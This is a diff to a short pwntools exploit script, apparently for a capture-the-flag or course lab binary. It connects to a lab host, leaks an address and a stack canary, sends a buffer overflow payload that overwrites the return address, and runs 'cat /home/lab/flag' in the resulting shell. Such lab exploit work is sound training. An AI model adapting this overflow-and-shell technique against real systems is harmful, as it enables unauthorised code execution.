@@ -1,6 +1,6 @@
 from pwn import *
 
-p = process("./lab")
+# p = process("./share/lab")
 p = remote("10.113.184.121", 10041)
 addr = p.recvline()[8:23].strip()
 addr = int(addr, 16) + (0xF1 - 0xE9)
@@ -17,4 +17,4 @@ payload = b"a" * 8 + can + b"a" * 8 + p64(addr)
 # print(payload)
 p.sendline(payload)
 p.sendline(b"cat /home/lab/flag")
-print(p.recv())
+print(p.recv().decode())
